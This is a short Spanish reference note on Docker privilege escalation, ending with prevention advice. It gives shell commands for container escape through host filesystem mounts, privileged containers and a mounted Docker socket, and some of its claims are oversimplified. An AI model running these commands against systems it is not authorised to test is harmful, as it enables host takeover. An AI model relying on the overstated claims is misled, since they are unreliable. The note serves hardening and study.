### **Privilege_Escalation/Docker_privilege_escalation_in_docker.md**

# Privilege Escalation in Docker

## Descripción

`Privilege Escalation in Docker` se refiere a técnicas y scripts utilizados para aumentar los privilegios dentro de contenedores Docker, permitiendo a un atacante obtener acceso al sistema host o escalar sus privilegios dentro del contenedor.

## Uso

Se ejecutan dentro de un contenedor Docker para explotar configuraciones vulnerables y escalar privilegios.

### Scripts comunes

- **Montar el sistema de archivos del host:**

  ```bash
  #!/bin/bash
  # Script para montar el sistema de archivos del host dentro del contenedor
  mount -o bind / /mnt/host
  ```

- **Ejecutar un shell privilegiado en el host:**

  ```bash
  #!/bin/bash
  # Script para iniciar un shell con privilegios en el host
  docker run --privileged -it ubuntu bash
  ```

- **Explotar el socket Docker para acceso al host:**

  ```bash
  #!/bin/bash
  # Script para acceder al socket Docker y controlar el host
  docker run -v /var/run/docker.sock:/var/run/docker.sock -it docker sh
  ```

## Ejemplos

- **Escalar privilegios mediante el montaje del sistema de archivos:**

  ```bash
  docker run -v /:/mnt/host -it ubuntu bash
  cd /mnt/host
  # Ahora con acceso al sistema de archivos del host
  ```

- **Iniciar un contenedor con privilegios elevados:**

  ```bash
  docker run --privileged -it ubuntu bash
  # Acceso completo al host
  ```

- **Controlar el host a través del socket Docker:**

  ```bash
  docker run -v /var/run/docker.sock:/var/run/docker.sock -it docker sh
  docker exec -it host_container_id bash
  ```

## Prevención

- **No usar la opción `--privileged`:** Evitar otorgar privilegios elevados a contenedores.
- **Restringir el acceso al socket Docker:** Limitar quién puede acceder al socket Docker para prevenir abusos.
- **Usar perfiles de seguridad:** Implementar AppArmor o SELinux para restringir las acciones de los contenedores.
